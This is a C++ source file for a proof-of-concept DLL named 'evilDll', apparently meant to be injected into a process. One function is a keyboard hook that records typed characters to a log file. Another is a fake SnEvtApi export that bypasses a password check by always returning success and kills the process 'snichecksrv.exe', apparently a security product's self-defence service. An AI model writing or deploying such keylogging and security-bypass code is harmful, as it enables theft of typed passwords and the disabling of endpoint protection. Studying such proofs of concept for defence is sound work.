#pragma once

// evilDll.cpp : Defines the exported functions for the DLL.
//

#include "pch.h"
#include "framework.h"
#include "evilDll.h"
#include "..\poc_InjectEject\fProcess.h"

//============================================================
//
//	KEYBOARD HOOK CALLBACK FUNCTION
//
//============================================================
EVILDLL_API int poc(int code, WPARAM wParam, LPARAM lParam) {
	//extern "C" __declspec(dllexport) BOOL poc() {
	UINT uScanCode = MapVirtualKey(wParam, 0);		 // scan code
	BYTE KeyState[256];                              // key-state array
	WORD BufChar;                                    // buffer for translated key
	UINT uFlags = 0;                                                 

	if (GetKeyState(wParam) & 0x8000) {				 // только для нажатия клавиши, релиз пропускаем, иначе дублируется

		GetKeyboardState(KeyState); // заносим состояние всех клавиш

		if (ToAscii(wParam, uScanCode, KeyState, &BufChar, uFlags) == 1) {

			OutputDebugString(TEXT("[evil_DLL] KEY PRESSED !"));
			std::ofstream outfile;
			outfile.open("c:\\logs\\evilDLL.log", std::ios_base::app);
			outfile << char(BufChar);
		}

		MessageBox(NULL, L"evilDLL: key pressed", L"evilDll", 0);
	}


	return(CallNextHookEx(NULL, code, wParam, lParam));
	//return TRUE;
}

//============================================================
//
//	Bypass SnEvtApi password request
//
//============================================================
SNEVTAPI_API int SnSelfdefElevatePrivilege(void)
{
	OutputDebugString(TEXT("[evil_DLL] FAKE SNEVTAPI -> SnSelfdefElevatePrivilege = 0"));
	if (POC_fProcess::killProcessByName(L"snichecksrv.exe")) {
		OutputDebugString(TEXT("[evil_DLL] FAKE SNEVTAPI kill snichecksrv.exe -> KILLED !"));
	}
	else {
		OutputDebugString(TEXT("[evil_DLL] FAKE SNEVTAPI kill snichecksrv.exe -> NOT KILLED !"));
	}
	return 0;
}